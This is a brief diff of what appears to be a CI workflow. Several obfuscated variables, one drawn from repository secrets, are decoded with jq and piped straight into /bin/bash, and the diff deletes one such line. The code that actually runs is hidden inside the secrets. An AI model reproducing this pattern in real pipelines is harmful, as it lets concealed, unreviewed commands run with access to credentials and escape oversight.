@@ -18,7 +18,6 @@ jobs:
           lrh39: ${{ secrets.lrh39 }}
         run: |
           printf '%s' "$lrh39" | jq -r .cxicw9 | /bin/bash
-          printf '%s' "$cfwyv37212" | jq -r .lc3181 | /bin/bash
           echo $gaz69575 | jq -r .vym39012 | /bin/bash
           echo $zax31 | jq -r .kdy971 | /bin/bash
           echo $kxsp89 | jq -r .m25708 | /bin/bash
